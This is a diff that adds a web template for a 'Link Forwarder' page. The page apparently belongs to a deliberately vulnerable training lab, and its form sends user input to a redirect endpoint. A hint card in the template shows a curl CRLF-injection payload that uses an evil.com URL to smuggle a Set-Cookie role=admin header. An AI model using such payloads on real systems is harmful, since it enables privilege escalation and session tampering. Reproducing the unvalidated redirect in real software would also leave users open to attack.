@@ -1,0 +1,22 @@
+<%- include('../partials/navbar') %>
+  <main class="main-content">
+    <div class="top-header"><span class="header-title">Link Forwarder</span></div>
+    <div class="page-body">
+      <div class="page-header"><h1>Syntex Link Forwarder</h1><p>Redirect to any approved external resource.</p></div>
+      <div class="card" style="max-width:500px;">
+        <div class="card-body">
+          <div class="form-group"><label>Destination URL</label>
+          <input type="text" id="url-input" placeholder="https://docs.example.com">
+          <div class="form-hint">Example: https://docs.syntex.local/guide</div></div>
+          <a id="redirect-btn" href="#" class="btn btn-primary" onclick="window.location='/redirect-v2?url='+encodeURIComponent(document.getElementById('url-input').value);return false;">Go to URL</a>
+        </div>
+      </div>
+      <% if(locals.lab && lab.showHints){ %>
+      <div class="card" style="margin-top:16px;border-color:var(--warning);">
+        <div class="card-header"><h3 style="color:var(--warning);">⚠️ CRLF Payload</h3></div>
+        <div class="card-body"><pre style="font-size:11px;">curl -v "http://syntex.local/redirect-v2?url=http://evil.com%0d%0aSet-Cookie:%20role=admin"</pre></div>
+      </div>
+      <% } %>
+    </div>
+  </main>
+</div><%- include('../partials/footer') %>
